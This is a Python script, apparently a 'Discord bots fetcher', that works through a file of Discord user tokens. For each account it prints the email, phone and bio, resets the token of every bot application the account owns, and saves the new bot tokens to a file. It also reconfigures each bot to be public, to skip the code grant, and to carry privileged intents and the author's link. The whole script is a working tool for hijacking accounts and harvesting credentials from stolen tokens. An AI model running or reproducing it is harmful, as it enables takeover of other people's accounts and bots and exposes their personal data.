import requests
import colorama
import time
from datetime import datetime
from colorama import init, Fore, Style
colorama.init()

bots = 0
accs = 0

class console():
    def success(text):
        print(f'[{Fore.LIGHTBLACK_EX}{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}{Fore.RESET}] {Fore.LIGHTWHITE_EX}[{Fore.RESET} {Fore.MAGENTA}SUCCESS{Fore.RESET} {Fore.LIGHTWHITE_EX}]{Fore.RESET} {Fore.MAGENTA}->{Fore.RESET} {text}')
    def error(text):
        print(f'[{Fore.LIGHTBLACK_EX}{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}{Fore.RESET}] {Fore.LIGHTWHITE_EX}[{Fore.RESET} {Fore.MAGENTA}ERROR{Fore.RESET} {Fore.LIGHTWHITE_EX}]{Fore.RESET} {Fore.MAGENTA}->{Fore.RESET} {text}')
    def info(text):
        print(f'[{Fore.LIGHTBLACK_EX}{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}{Fore.RESET}] {Fore.LIGHTWHITE_EX}[{Fore.RESET} {Fore.MAGENTA}INFO{Fore.RESET} {Fore.LIGHTWHITE_EX}]{Fore.RESET} {Fore.MAGENTA}->{Fore.RESET} {text}')

def configureBot(token, botToken):
    headers = {
        "Authorization": f"Bot {botToken}",
        "Content-Type": "application/json"
    }

    payload = {
        "description": "*By https://github.com/notxVirus/discord-bots-fetcher*",
        "flags": 565248
    }

    bot = requests.get("https://discord.com/api/v9/users/@me", headers = headers)
    if bot.status_code == 200:
        bot = bot.json()

        old_intents = requests.get("https://discord.com/api/v9/oauth2/applications/@me", headers = headers)
        intents = old_intents.json()

        response = requests.patch(f"https://discord.com/api/v9/applications/{bot['id']}", headers = headers, json = payload)
        app = response.json()


        if app['integration_public'] is False:
            console.info(f"{Fore.LIGHTBLACK_EX}The '{Fore.MAGENTA}integration_public{Fore.LIGHTBLACK_EX}' function is currently disabled in the {Fore.RESET}{Fore.MAGENTA}{bot['username']}{Fore.RESET} ({Fore.MAGENTA}{bot['id']}{Fore.RESET}){Fore.LIGHTBLACK_EX} bot. We are currently working to turn this function on...{Fore.RESET}")
            integration_public = requests.patch(f"https://discord.com/api/v9/applications/{bot['id']}", headers = {'Content-Type': 'application/json', 'Authorization': token}, json = {'integration_public': True, 'confirm': True})
            if integration_public.status_code == 200:
                console.success(f"{Fore.LIGHTBLACK_EX}Successfully enabled the 'integration_public' function for the {Fore.RESET}{Fore.MAGENTA}{bot['username']}{Fore.RESET} ({Fore.MAGENTA}{bot['id']}{Fore.RESET}) {Fore.LIGHTBLACK_EX}bot.{Fore.RESET}")
            else:
                console.error(f"{Fore.LIGHTBLACK_EX}Failed to enabled 'integration_public' function for the {Fore.RESET}{Fore.MAGENTA}{bot['username']} {Fore.RESET}({Fore.MAGENTA}{bot['id']}{Fore.RESET}) {Fore.LIGHTBLACK_EX}bot.{Fore.RESET}")

        if app['integration_require_code_grant'] is True:
            console.info(f"{Fore.LIGHTBLACK_EX}The '{Fore.MAGENTA}integration_require_code_grant{Fore.LIGHTBLACK_EX}' function is currently enabled in the {Fore.RESET}{Fore.MAGENTA}{bot['username']}{Fore.RESET} ({Fore.MAGENTA}{bot['id']}{Fore.RESET}){Fore.LIGHTBLACK_EX} bot. We are currently working to disable this function...{Fore.RESET}")
            integration_require_code_grant = requests.patch(f"https://discord.com/api/v9/applications/{bot['id']}", headers = {'Content-Type': 'application/json', 'Authorization': token}, json = {'integration_require_code_grant': False, 'confirm': True})
            if integration_require_code_grant.status_code == 200:
                console.success(f"{Fore.LIGHTBLACK_EX}Successfully disabled the 'integration_require_code_grant' function for the {Fore.RESET}{Fore.MAGENTA}{bot['username']}{Fore.RESET} ({Fore.MAGENTA}{bot['id']}{Fore.RESET}) {Fore.LIGHTBLACK_EX}bot.{Fore.RESET}")
            else:
                console.error(f"{Fore.LIGHTBLACK_EX}Failed to disable 'integration_require_code_grant' function for the {Fore.RESET}{Fore.MAGENTA}{bot['username']} {Fore.RESET}({Fore.MAGENTA}{bot['id']}{Fore.RESET}) {Fore.LIGHTBLACK_EX}bot.{Fore.RESET}")

        if response.status_code == 200:
            console.success(f"{Fore.LIGHTBLACK_EX}Configured the{Fore.RESET} {Fore.MAGENTA}{bot['username']} {Fore.RESET}({Fore.MAGENTA}{bot['id']}{Fore.RESET}) {Fore.LIGHTBLACK_EX}bot successfully.{Fore.RESET}")
        else:
            console.error(f"{Fore.LIGHTBLACK_EX}Failed to configure{Fore.RESET} {bot['username']} {bot['id']}. {response.text}")
    config = requests.get(f"https://discord.com/api/v9/applications/{bot['id']}", headers = headers)
    if config.status_code == 200:
        console.info(f"{Fore.LIGHTBLACK_EX}Information about changed things in {Fore.RESET}{Fore.MAGENTA}{bot['username']} {Fore.RESET}({Fore.MAGENTA}{bot['id']}{Fore.RESET}) {Fore.LIGHTBLACK_EX}bot: {Fore.RESET}")
        config = config.json()
        console.info(f"{Fore.LIGHTBLACK_EX}Public: {app['integration_public']} {Fore.MAGENTA}->{Fore.RESET} {Fore.LIGHTBLACK_EX}{config['integration_public']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}Intents: {intents['flags']} {Fore.MAGENTA}->{Fore.RESET} {Fore.LIGHTBLACK_EX}{config['flags']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}oAuth2 code grant req: {app['integration_require_code_grant']} {Fore.MAGENTA}->{Fore.RESET} {Fore.LIGHTBLACK_EX}{config['integration_require_code_grant']}{Fore.RESET}")

def applicationsInformation(token):
    headers = {
        'Authorization': f'{token}'
    }

    response = requests.get('https://discord.com/api/v9/applications', headers = headers)

    if response.status_code == 200:
        applications = response.json()
        if applications:
            for application in applications:
                #console.success(f"Getting information about {Fore.MAGENTA}{application['name']}{Fore.RESET} ({Fore.MAGENTA}{application['id']}{Fore.RESET}){Fore.RESET}")
                console.info(f"{Fore.LIGHTBLACK_EX}Getting {Fore.MAGENTA}{application['name']}{Fore.RESET} ({Fore.MAGENTA}{application['id']}{Fore.RESET}){Fore.RESET} {Fore.LIGHTBLACK_EX}token...{Fore.RESET}")
                reset_url = f"https://discord.com/api/v9/applications/{application['id']}/bot/reset"
                payload = {
                    "reset": True,
                    "confirm": True
                }
                headers = {
                    "Authorization": token
                }
                time.sleep(1)
                response = requests.post(reset_url, headers = headers, json = payload)
                
                if response.status_code == 200:
                    botToken = response.json().get("token")
                    if botToken is not None:
                        with open('botTokens.txt', 'a') as file:
                            file.write(botToken + '\n')
                        console.success(f"{Fore.LIGHTBLACK_EX}Bot token for application{Fore.RESET} {Fore.MAGENTA}{application['name']}{Fore.RESET} ({Fore.MAGENTA}{application['id']}{Fore.RESET}){Fore.RESET} {Fore.LIGHTBLACK_EX}has been reset. New token:{Fore.RESET} {Fore.MAGENTA}{botToken[:26]}...{Fore.RESET}")
                        configureBot(token, botToken)
                    else:
                        console.error(f"{Fore.LIGHTBLACK_EX}Failed to retrieve new bot token for application{Fore.RESET} {Fore.MAGENTA}{application['name']}{Fore.RESET} ({Fore.MAGENTA}{application['id']}{Fore.RESET}){Fore.RESET}{Fore.LIGHTBLACK_EX}.{Fore.RESET} {response.text}")
                else:
                    console.error(f"{Fore.LIGHTBLACK_EX}Failed to reset bot token for application{Fore.RESET} {Fore.MAGENTA}{application['name']}{Fore.RESET} ({Fore.MAGENTA}{application['id']}{Fore.RESET}){Fore.RESET}{Fore.LIGHTBLACK_EX}.{Fore.RESET} {response.text}")
        else:
            console.info(f"{Fore.LIGHTBLACK_EX}No applications (bots) found.{Fore.RESET}")
    else:
        console.error(f"{Fore.LIGHTBLACK_EX}Failed to retrieve applications.{Fore.RESET} {response.text}")

def fetchApplications(token):
    global bots
    headers = {
        'Authorization': f'{token}'
    }

    response = requests.get('https://discord.com/api/v9/applications', headers=headers)

    if response.status_code == 200:
        applications = response.json()
        if applications:
            console.success(f"{Fore.LIGHTBLACK_EX}Application(s) found:{Fore.RESET}")
            a = 0
            for application in applications:
                a += 1
                bots += 1
                console.info(f"{a}. {Fore.LIGHTBLACK_EX}{application['name']} {Fore.RESET}({Fore.LIGHTBLACK_EX}{application['id']}{Fore.RESET})")
            applicationsInformation(token)
        else:
            console.info(f"{Fore.LIGHTBLACK_EX}No applications (bots) found.{Fore.RESET}")
    else:
        console.error(f"{Fore.LIGHTBLACK_EX}Failed to retrieve applications.{Fore.RESET} {response.text}")


def login(token):
    global accs
    console.info(f"{Fore.LIGHTBLACK_EX}Getting {Fore.MAGENTA}{token[:26]}{Fore.RESET} {Fore.LIGHTBLACK_EX}token information...{Fore.RESET}\n")
    url = f"https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": token
    }

    response = requests.get(url, headers = headers)

    if response.status_code == 200:
        user = response.json()
        console.success(f"{Fore.LIGHTBLACK_EX}Information about{Fore.RESET} {Fore.MAGENTA}{token[:26]}{Fore.RESET} {Fore.LIGHTBLACK_EX}account: {Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}Username: {user['username']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}ID: {user['id']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}Locale: {user['locale']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}Email: {user['email']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}Phone: {user['phone']}{Fore.RESET}")
        console.info(f"{Fore.LIGHTBLACK_EX}Bio: {user['bio']}{Fore.RESET}\n")
        time.sleep(1)
        accs += 1
        fetchApplications(token)
    else:
        if response.status_code != 200:
            with open("tokens.txt", "r") as f:
                lines = f.readlines()
            with open("tokens.txt", "w") as f:
                for line in lines:
                    if line.strip("") != f"{token}":
                        f.write(line)
        console.error(f"{Fore.LIGHTBLACK_EX}Unable to fetch user information by using {Fore.MAGENTA}{token[:26]}{Fore.RESET} {Fore.LIGHTBLACK_EX}token.{Fore.RESET}")

with open('tokens.txt', 'r+') as f: 
    tokens = f.read().splitlines()
for token in tokens:
    login(token)
console.success(f"{Fore.LIGHTBLACK_EX}Checked {Fore.MAGENTA}{accs}{Fore.RESET}{Fore.LIGHTBLACK_EX} accont(s) and fetched {Fore.MAGENTA}{bots}{Fore.RESET}{Fore.LIGHTBLACK_EX} bot(s).{Fore.RESET}")
input("Press any key to close the command prompt.")
os.system("exit")